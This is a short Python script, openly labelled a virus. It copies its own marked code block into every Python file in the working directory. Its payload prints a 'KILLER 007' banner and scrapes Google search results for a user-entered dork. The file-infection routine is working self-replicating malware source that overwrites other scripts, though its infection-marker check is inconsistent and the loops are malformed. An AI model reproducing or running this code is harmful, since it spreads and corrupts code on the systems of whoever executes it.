## Start virus ##
import sys,glob
import requests
from bs4 import BeautifulSoup
code = []
with open(sys.argv[0],'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == "## Start virus ##\n":
        virus_area = True
    if virus_area:
        code.append(line)   
    if line == "## End of virus ##":
        break

    python_files = glob.glob('*.py')  
    #print("Files are: ",python_files)
    for file in python_files:
     with open (file,'r') as f:
         script_code = f.readlines()   
     infected = False
     for line in script_code:
         if line =="## Sor shit lar ##\n":
            infected = True 
            break       
         if not infected:
              final_code = []
              final_code.extend(code)
              final_code.extend('\n') 
              final_code.extend(script_code) 
              with open(file, 'w') as f:
                  f.writelines(final_code)

##payload ##
print("*" * 70)

print("*" * 70)
print("{Y}    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗      ██████╗  ██████╗ ███████╗ ")
print("{Y}    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗    ██╔═████╗██╔═████╗╚════██║ ")
print("{Y}    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝    ██║██╔██║██║██╔██║    ██╔╝")
print("{Y}    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗    ████╔╝██║████╔╝██║   ██╔╝")
print("{Y}    ██║  ██╗██║███████╗███████╗███████╗██║  ██║    ╚██████╔╝╚██████╔╝   ██║ ")
print ("=" * 80)

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
	}
tabUrl="https://www.google.com/search?client=firefox-b-d&q="
dork =  input("Enter your dorks ::")
url = tabUrl+dork
filter = input("Enter filter world :: ")
print("Total sites found from that url")
print ("=" * 80)
req = requests.get(url, headers=headers)
soup = BeautifulSoup(req.text , "html.parser")
lista=[]
for link in soup.find_all('a', href=True):
    lista.append(link.get('href'))

for text in lista:
    if filter in text:
        print (text) 

                   
## End of virus ##
